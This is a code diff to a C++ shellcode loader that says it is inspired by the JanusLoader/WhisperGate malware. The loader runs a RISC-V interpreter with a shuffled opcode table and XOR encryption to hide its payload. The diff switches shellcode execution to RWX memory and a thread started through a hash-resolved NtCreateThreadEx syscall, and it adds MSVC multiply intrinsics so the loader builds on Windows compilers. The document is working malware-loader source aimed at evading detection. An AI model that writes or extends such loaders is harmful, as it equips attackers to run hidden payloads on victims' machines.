@@ -2,6 +2,10 @@
 // Inspired by JanusLoader (Whispergate)
 // Full RV64IM interpreter with Fisher-Yates opcode shuffle and XOR encryption
 
+#ifdef _MSC_VER
+#include <intrin.h>
+#endif
+
 struct RiscVm {
     int64_t  regs[32];
     uint64_t pc;
@@ -75,9 +79,11 @@ static void rv_handle_ecall(RiscVm* vm) {
             if (!base) { vm->halted = true; break; }
             memcpy(base, sc, sc_len);
             ULONG old_prot;
-            NtPVM(hProc, &base, &size, PAGE_EXECUTE_READ, &old_prot);
-            auto fn = reinterpret_cast<void(*)()>(base);
-            fn();
+            NtPVM(hProc, &base, &size, PAGE_EXECUTE_READWRITE, &old_prot);
+            auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
+            if (NtCTE) NtCTE(&g_sc_thread, THREAD_ALL_ACCESS, NULL, hProc,
+                             base, NULL, 0x1, 0, 0, 0, NULL);
+            vm->halted = true;
             break;
         }
         case RV_ECALL_EXIT:
@@ -205,16 +211,35 @@ static void rv_op_reg(RiscVm* vm, uint32_t inst) {
         switch (f3) {
             case 0: result = a * b; break;
             case 1: {
+#ifdef _MSC_VER
+                int64_t hi;
+                _mul128(a, b, &hi);
+                result = hi; break;
+#else
                 __int128 r = (__int128)a * (__int128)b;
                 result = (int64_t)(r >> 64); break;
+#endif
             }
             case 2: {
+#ifdef _MSC_VER
+                int64_t hi;
+                _mul128(a, b, &hi);
+                if (b < 0) hi -= a;
+                result = hi; break;
+#else
                 __int128 r = (__int128)a * (unsigned __int128)(uint64_t)b;
                 result = (int64_t)(r >> 64); break;
+#endif
             }
             case 3: {
+#ifdef _MSC_VER
+                uint64_t hi;
+                _umul128((uint64_t)a, (uint64_t)b, &hi);
+                result = (int64_t)hi; break;
+#else
                 unsigned __int128 r = (unsigned __int128)(uint64_t)a * (unsigned __int128)(uint64_t)b;
                 result = (int64_t)(uint64_t)(r >> 64); break;
+#endif
             }
             case 4: result = b ? a / b : -1; break;
             case 5: result = b ? (int64_t)((uint64_t)a / (uint64_t)b) : (int64_t)~0ULL; break;
